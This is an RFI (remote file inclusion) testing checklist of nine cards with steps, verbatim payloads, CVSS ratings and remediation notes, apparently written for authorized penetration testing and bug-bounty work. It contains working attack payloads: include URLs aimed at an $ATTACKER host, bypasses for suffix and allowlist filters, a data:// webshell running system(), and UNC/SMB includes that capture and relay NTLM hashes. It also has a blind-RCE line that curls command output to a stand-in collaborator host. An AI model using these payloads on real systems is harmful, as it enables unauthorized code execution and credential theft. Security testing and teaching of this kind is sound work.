# RFI — Checklist

Expert per-attack **test-case matrix** for RFI — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*9 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## RFI-001 — Find include sinks + stand up a payload host
**Test Category:** Recon &amp; Lab · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** page/file/include/template/module/plugin/theme URL params; confirmed LFI include sinks

**Test Steps:** 1. Find include sinks selectable by URL; re-test confirmed LFI INCLUDE sinks as RFI candidates.<br>2. Stand up a payload host serving PHP as text/plain and logging hits (poc/payload_host.py).<br>3. Stand up an OOB listener (interactsh) for blind cases.

**Expected Result:** A list of include sinks and a live payload host + OOB listener.

**Payload Example:**

```
?page=http://$ATTACKER/shell.txt ; payload_host.py serving text/plain
```

**Impact:** RFI needs a text/plain payload host; serving as PHP would execute on your box, not proof.

**Tools:** poc/payload_host.py, interactsh

**References:** CWE-98; OWASP Testing Guide: RFI (WSTG-INPV-11)

---

## RFI-002 — Baseline — prove EXECUTION (not fetch)
**Test Category:** Baseline · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Each include sink

**Test Steps:** 1. Point the include at your host with &lt;?php echo 7*7*7; ?&gt; -&gt; '343' appears = execution = RFI.<br>2. Distinguish: executed (RFI) / fetched-only (SSRF) / raw-text (non-exec) / no-hit.<br>3. Note forced suffix, allow_url_include behavior, server source IP.

**Expected Result:** '343' (or your computed marker) appears, proving your code executed on the target.

**Payload Example:**

```
?page=http://$ATTACKER/shell.txt with <?php echo 7*7*7; ?> -> 343
```

**Impact:** Execution distinguishes RFI (Critical RCE) from a mere SSRF fetch.

**Tools:** poc/payload_host.py

**References:** CWE-98; PortSwigger Web Security Academy: Remote file inclusion

---

## RFI-003 — Serve as text/plain + defeat forced .php suffix
**Test Category:** Make it Land · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Sinks appending a forced extension

**Test Steps:** 1. Serve the payload as .txt / text/plain (so it isn't executed on your box).<br>2. Defeat a forced .php suffix: append ? (most reliable), %23 (fragment), or %00 (legacy).<br>3. Use :80 if high ports are egress-blocked.

**Expected Result:** The remote payload is included and executed despite the forced suffix.

**Payload Example:**

```
?page=http://$ATTACKER:8000/shell.txt?  (the ? swallows an appended .php)
```

**Impact:** Restores RFI execution against a forced extension.

**Tools:** poc/payload_host.py

**References:** CWE-98; CWE-94; HackTricks: LFI/RFI

---

## RFI-004 — Scheme / encoding / host-allowlist bypass
**Test Category:** Make it Land · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Sinks filtering scheme/host

**Test Steps:** 1. Scheme/encoding: hTtP://, http:/\host, http://0xC0A80001/ (hex IP), http://3232235521/ (decimal), encoded slash.<br>2. Host allowlist: open-redirect bounce / @ / contains / trusted subdomain.<br>3. Also ftp:// and :80.

**Expected Result:** The include reaches your host despite scheme/host filtering.

**Payload Example:**

```
?page=hTtP://0xC0A80001/shell.txt? ; ?page=http://trusted.com@$ATTACKER/shell.txt?
```

**Impact:** Bypasses scheme/host filters - proves the fix incomplete.

**Tools:** Burp

**References:** CWE-98; CWE-94; HackTricks: LFI/RFI

---

## RFI-005 — data:// / php://input when http:// is blocked
**Test Category:** Make it Land · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Sinks with allow_url_include but blocked http fetch

**Test Steps:** 1. data://text/plain;base64,&lt;b64 php&gt; executes without a remote fetch.<br>2. php://input with the PHP in the POST body.<br>3. expect://id where the wrapper is enabled.

**Expected Result:** A wrapper executes your code with no outbound fetch.

**Payload Example:**

```
?page=data://text/plain;base64,<b64 <?php system($_GET[c]);?>>&c=id ; php://input
```

**Impact:** RFI-equivalent RCE when http:// egress is blocked - Critical.

**Tools:** Burp, curl

**References:** CWE-98; CWE-94; HackTricks: LFI/RFI

---

## RFI-006 — Windows UNC / SMB include + NTLM capture/relay + WebDAV
**Test Category:** Make it Land · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Windows include sinks

**Test Steps:** 1. UNC/SMB include: \\$ATTACKER\share\shell.php via impacket-smbserver.<br>2. Even if it doesn't execute, the UNC fetch leaks NetNTLMv2 to Responder (crack -m 5600) or relay (ntlmrelayx) - an SSRF/auth-coercion finding on its own.<br>3. SMB/445 blocked -&gt; WebDAV: \\$ATTACKER@80\share\x / @SSL@443 (UNC over HTTP/HTTPS).

**Expected Result:** The UNC include executes and/or leaks NetNTLMv2 to your listener.

**Payload Example:**

```
\\$ATTACKER\share\shell.php ; \\$ATTACKER@80\share\x (WebDAV)
```

**Impact:** RCE and/or NTLM hash capture/relay - Critical/High.

**Tools:** impacket-smbserver, Responder, ntlmrelayx

**References:** CWE-98; CWE-94; HackTricks: LFI/RFI

---

## RFI-007 — RCE impact + blind execution proof
**Test Category:** Impact — RCE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Confirmed RFI

**Test Steps:** 1. Confirm RCE with a benign computed marker, then a single system('id')/whoami.<br>2. Blind: prove execution via a callback CARRYING command output (curl $COLLAB/exec_$(id)) or sleep(10) - not just a fetch.<br>3. Authorized red-team only: shell / read config (read-only); clean up.

**Expected Result:** id/whoami output (or a command-output callback) confirms code execution.

**Payload Example:**

```
&c=id ; blind: <?php system('curl -s http://$COLLAB/exec_$(id|tr " " _)'); ?>
```

**Impact:** Remote code execution on the target - Critical.

**Tools:** poc/payload_host.py, interactsh

**References:** CWE-98; CWE-94; PortSwigger Web Security Academy: Remote file inclusion

---

## RFI-008 — False-positive filter (RFI vs SSRF)
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT as RFI: the server only FETCHED your URL (no execution) -&gt; that's SSRF, report there; raw &lt;?php text merely DISPLAYED (non-executing context); open redirect / remote image mislabeled; http:// refused and you DIDN'T test data:///php://input/UNC; a blind hit with NO execution proof; DoS via a huge remote file.<br>2. REQUIRE: proven EXECUTION (computed marker / id / command-output callback).

**Expected Result:** Only proven-execution candidates are RFI; fetch-only is reclassified SSRF.

**Payload Example:**

```
fetch-only = SSRF ; displayed <?php = non-exec ; blind hit w/o exec = not proven
```

**Impact:** Protects credibility; RFI is dense with SSRF-mislabeled and non-exec false positives.

**Tools:** manual

**References:** CWE-98; PortSwigger Web Security Academy: Remote file inclusion

---

## RFI-009 — Client-facing impact &amp; SAFE PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with RCE; state it's execution (RFI), not a fetch (SSRF).<br>2. Provide the include payload, the payload-host log, and the computed marker (343) + one id output.<br>3. Set CVSS 3.1 + CWE-98 (+94). Remediation: never include from user input; use an allowlist of fixed local modules; disable allow_url_include/allow_url_fopen; block dangerous wrappers; egress-filter.<br>4. Benign marker + one id, remove written files/shells, validate creds read-only; de-dupe to one sink, confirm on production.

**Expected Result:** A reproducible, correctly-rated RCE PoC with clear remediation.

**Payload Example:**

```
PoC: include payload + host log + 343 marker + one id + CVSS + CWE-98 + remediation.
```

**Impact:** Converts execution into a defensible Critical (RCE) report.

**Tools:** CVSS calculator, RFI_REPORT_TEMPLATE.md

**References:** CWE-98; CWE-94; FIRST CVSS v3.1; OWASP Testing Guide: RFI (WSTG-INPV-11)  |  TOP REFERENCES: PayloadsAllTheThings; HackTricks; OWASP; impacket/Responder docs

---
